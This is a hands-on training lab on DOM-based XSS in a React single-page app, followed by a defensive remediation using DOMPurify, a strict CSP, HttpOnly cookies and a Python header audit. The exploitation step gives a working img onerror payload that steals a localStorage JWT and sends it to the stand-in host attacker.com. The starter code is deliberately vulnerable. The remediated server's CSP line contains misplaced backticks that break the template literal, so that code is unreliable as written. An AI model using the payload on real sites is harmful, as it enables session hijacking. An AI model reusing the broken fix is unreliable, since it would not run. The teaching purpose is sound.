---
title: '06. Hands-On Lab: Exploiting & Securing a Modern React SPA'
description: Step-by-step hands-on vulnerability lab demonstrating DOM XSS token theft
  from LocalStorage, automated data exfiltration, and multi-layered remediation using
  DOMPurify, Strict CSP, and HttpOnly cookies.
keywords:
- AppSec
- Cybersecurity
- Hands-On
- Lab
- DOM
- XSS
- Exploit
- Token
- Exfiltration
- LocalStorage
- Exploit
- DOMPurify
- Strict
- CSP
- HttpOnly
- Cookie
- Fix
- Python
- Verification
- Script
slug: /web-and-api/frontend-security/hands-on-lab
---


# 06. Hands-On Lab: Exploiting & Securing a Modern React SPA

In this hands-on lab, you will step into the shoes of both an offensive security researcher and a defensive application security engineer. You will analyze a vulnerable React Single Page Application (SPA), craft a DOM-based XSS payload to exfiltrate session tokens stored insecurely in `LocalStorage`, and then engineer a robust, production-grade defense using **DOMPurify sanitization**, **Strict CSP v3**, and **`HttpOnly` Cookie architecture**.

---

## 🧪 Lab Architecture Overview

The lab environment consists of a React client application and an Express backend API.

```mermaid
sequenceDiagram
    autonumber
    actor Victim as Victim User Browser
    actor Attacker as Attacker Listener (attacker.com)
    participant SPA as Vulnerable React SPA
    participant API as Express API Server

    Note over Victim,SPA: PHASE 1: EXPLOITATION
    Victim->>SPA: Navigate to Board: ?comment=<img src=x onerror="...">
    SPA->>SPA: Render comment via dangerouslySetInnerHTML
    SPA->>Attacker: Execute Payload -> Send window.localStorage.getItem('auth_token')
    Attacker->>Attacker: Log Stolen JWT Access Token!

    Note over Victim,API: PHASE 2: REMEDIATION
    SPA->>SPA: Apply DOMPurify.sanitize() + Trusted Types
    API->>Victim: Return Strict CSP Header + HttpOnly __Host- Cookie
    Attacker--XVictim: Inline script execution blocked by CSP & DOMPurify!
```

---

## 1. Vulnerable Starter Codebase

### A. Vulnerable React Component (`CommentBoard.jsx`)
This component renders user comments using React's `dangerouslySetInnerHTML` escape hatch without sanitization.

```jsx
import React, { useState, useEffect } from 'react';

export function CommentBoard() {
  const [comments, setComments] = useState([]);
  const [newComment, setNewComment] = useState('');

  // SIMULATION: Insecure initial token storage on component mount
  useEffect(() => {
    localStorage.setItem(
      'auth_token',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMDExIiwicm9sZSI6ImFkbWluIn0.VulnerableSecretSignatureToken'
    );
  }, []);

  const handleAddComment = (e) => {
    e.preventDefault();
    setComments([...comments, { id: Date.now(), text: newComment }]);
    setNewComment('');
  };

  return (
    <div style={{ padding: '20px', fontFamily: 'sans-serif' }}>
      <h2>Community Discussion Board</h2>
      
      <form onSubmit={handleAddComment}>
        <input
          type="text"
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          placeholder="Write a comment..."
          style={{ width: '300px', padding: '8px' }}
        />
        <button type="submit" style={{ padding: '8px 16px', marginLeft: '10px' }}>
          Post Comment
        </button>
      </form>

      <h3>Comments</h3>
      <ul>
        {comments.map((c) => (
          // VULNERABLE SINK: Unsanitized user input rendered into innerHTML
          <li key={c.id} dangerouslySetInnerHTML={{ __html: c.text }} />
        ))}
      </ul>
    </div>
  );
}
```

### B. Vulnerable Express Server (`server.js`)
The backend serves the application without security headers or cookie controls.

```javascript
const express = require('express');
const app = express();

app.use(express.json());
app.use(express.static('dist'));

// VULNERABLE: Missing Content-Security-Policy, X-Content-Type-Options, etc.
app.get('/api/comments', (req, res) => {
  res.json([
    { id: 1, text: 'Welcome to the discussion board!' }
  ]);
});

app.listen(3000, () => {
  console.log('Vulnerable server running on http://localhost:3000');
});
```

---

## 2. Step-by-Step Exploitation Walkthrough

### Step 1: Source and Sink Analysis
1. Inspect `CommentBoard.jsx`. Observe that `newComment` state is derived directly from user form input or URL parameters (Source).
2. Trace the variable to `<li dangerouslySetInnerHTML={{ __html: c.text }} />` (Sink).
3. Confirm that no sanitization function is called prior to rendering.

### Step 2: Crafting the Exfiltration Payload
To hijack the user session, the attacker crafts an HTML image payload with an invalid `src` attribute. When the browser fails to load the image, it triggers the `onerror` event handler in the context of the victim's origin.

```html
<img src="x" onerror="
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/log?stolen_token=' + encodeURIComponent(token), {
    mode: 'no-cors'
  });
">
```

### Step 3: Triggering the Exploit
1. Submit the payload into the comment input field.
2. Open Chrome DevTools -> **Network Tab**.
3. Observe the outgoing `GET` request sent to `https://attacker.com/log?stolen_token=eyJhbGci...`.
4. The attacker now possesses the raw JWT token and can replay it to impersonate the victim administrator!

---

## 3. Multi-Layered Defensive Remediation

To eliminate this vulnerability, we apply a defense-in-depth architecture consisting of three defensive layers.

### Layer 1: Sanitization via DOMPurify (`RemediatedCommentBoard.jsx`)
Update the React component to sanitize input using `DOMPurify` before passing it to `dangerouslySetInnerHTML`.

```jsx
import React, { useState, useEffect } from 'react';
import DOMPurify from 'dompurify';

export function RemediatedCommentBoard() {
  const [comments, setComments] = useState([]);
  const [newComment, setNewComment] = useState('');

  const handleAddComment = (e) => {
    e.preventDefault();
    
    // REMEDIATION LAYER 1: Sanitize input string before storing in state
    const cleanHtml = DOMPurify.sanitize(newComment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
      ALLOWED_ATTR: []
    });

    setComments([...comments, { id: Date.now(), text: cleanHtml }]);
    setNewComment('');
  };

  return (
    <div style={{ padding: '20px' }}>
      <h2>Secured Discussion Board</h2>
      <form onSubmit={handleAddComment}>
        <input
          type="text"
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          placeholder="Write a comment..."
        />
        <button type="submit">Post Comment</button>
      </form>

      <h3>Comments</h3>
      <ul>
        {comments.map((c) => (
          // SECURE: Render sanitized HTML string safely
          <li key={c.id} dangerouslySetInnerHTML={{ __html: c.text }} />
        ))}
      </ul>
    </div>
  );
}
```

---

### Layer 2: Secure Cookie Architecture (`remediated-server.js`)
Migrate token storage away from `LocalStorage` entirely. Set session tokens using server-side `HttpOnly` cookies with the `__Host-` prefix.

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

app.use(express.json());

// REMEDIATION LAYER 2 & 3: Strict CSP Nonce + HttpOnly Cookie Setup
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  // Enforce Strict Nonce-Based CSP v3 Header
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'none'; script-src 'nonce-`${nonce}' 'strict-dynamic'; style-src 'self' 'nonce-$`{nonce}'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';`
  );
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

app.post('/api/login', (req, res) => {
  const sessionToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...SecureToken';

  // Issue __Host- prefixed HttpOnly cookie
  res.cookie('__Host-session', sessionToken, {
    httpOnly: true, // Prevents JavaScript document.cookie access!
    secure: true,   // Transmitted only over HTTPS
    sameSite: 'strict', // Eliminates CSRF
    path: '/'
  });

  res.json({ status: 'AUTHENTICATED' });
});

app.listen(3000, () => {
  console.log('Remediated secure server running on http://localhost:3000');
});
```

---

## 4. Automated Verification Script (`verify_lab_remediation.py`)

Run this Python verification script to test whether your remediated application passes automated security baseline checks.

```python
#!/usr/bin/env python3
import requests
import sys

TARGET_URL = "http://localhost:3000"

def audit_security_headers():
    print(f"[*] Auditing Target: {TARGET_URL}")
    try:
        response = requests.get(TARGET_URL)
        headers = response.headers

        # 1. Verify Content Security Policy Header Presence & Nonce Policy
        csp = headers.get("Content-Security-Policy", "")
        if not csp:
            print("[FAIL] Missing Content-Security-Policy header!")
            return False
        
        print(f"[+] Found CSP Header: {csp}")
        if "nonce-" in csp and "'strict-dynamic'" in csp:
            print("[PASS] Strict Nonce-Based CSP v3 verified.")
        else:
            print("[WARN] CSP header present, but missing nonce or 'strict-dynamic'.")

        # 2. Verify Frame Options & MIME Sniffing Headers
        if headers.get("X-Content-Type-Options") == "nosniff":
            print("[PASS] X-Content-Type-Options: nosniff verified.")
        else:
            print("[FAIL] Missing X-Content-Type-Options header.")

        if headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"]:
            print("[PASS] X-Frame-Options clickjacking protection verified.")
        else:
            print("[FAIL] Missing X-Frame-Options header.")

        print("\n[SUCCESS] Security verification audit completed.")
        return True

    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        return False

if __name__ == "__main__":
    success = audit_security_headers()
    sys.exit(0 if success else 1)
```

---
